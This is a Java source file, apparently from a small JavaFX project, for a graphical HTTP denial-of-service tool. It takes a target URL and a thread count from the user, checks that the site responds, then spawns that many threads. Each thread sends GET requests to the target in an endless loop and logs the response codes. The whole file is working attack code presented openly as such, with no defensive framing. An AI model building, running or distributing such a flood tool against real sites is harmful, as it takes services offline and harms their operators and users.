package sample;

import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.control.*;
import javafx.scene.paint.Color;
import javafx.scene.text.Text;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;


import static java.lang.Integer.parseInt;

public class Controller {
    @FXML private TextField url;
    @FXML private TextArea status;
    @FXML private ListView<Text> log ;
    @FXML private ProgressBar progress;
    @FXML private TextField url1;
    ObservableList<Text> items = FXCollections.observableArrayList ();
    @FXML
    void OnAttack(ActionEvent event){
        String entered_url = url.getText().toString();
        Boolean stat = testConnection(entered_url);
        if(stat){
            status.setText("Running...");
            startAttack(entered_url);
        }
        else{
            status.setText("Not Connected");
        }
        System.out.println(entered_url);
    }
    public boolean testConnection(String requests){
        URL url = null;
        int responseCode = 404;
        try {
            url = new URL(requests);
            HttpURLConnection huc = (HttpURLConnection) url.openConnection();
            responseCode = huc.getResponseCode();

        } catch (Exception e) {
            System.out.println(e.getMessage());
        }
        System.out.println(HttpURLConnection.HTTP_OK);
        return responseCode == HttpURLConnection.HTTP_OK;
    }
    public void startAttack(String requesturi){
            int n = parseInt(url1.getText());
            for (int i = 0; i < n; i++) {

                DosThread thread = null;
                try {
                    thread = new DosThread(requesturi);


                } catch (Exception e) {
                    System.out.println(e.getMessage());
                }
                thread.start();
                progress.setProgress(i);
            }
        }

    public class DosThread extends Thread {

        private final URL url;
        String param ;
        public DosThread(String request) throws Exception {
            url = new URL(request);
            param = "param1=" + URLEncoder.encode("87845", StandardCharsets.UTF_8);
        }


        @Override
        public void run() {
            while (true) {
                try {
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("GET");
                    if(connection.getResponseCode()==200){
                        Text t = new Text(this + " " + connection.getResponseCode());
                        items.add(t);

                    }else{
                        Text t = new Text(this + " " + connection.getResponseCode());
                        t.setText(this + " " + connection.getResponseCode());
                        t.setFill(Color.RED);
                        items.add(t);
                    }
                    log.setItems(items);

                } catch (Exception e) {
                    System.out.println(e.getMessage());
                }
            }

        }


    }

}


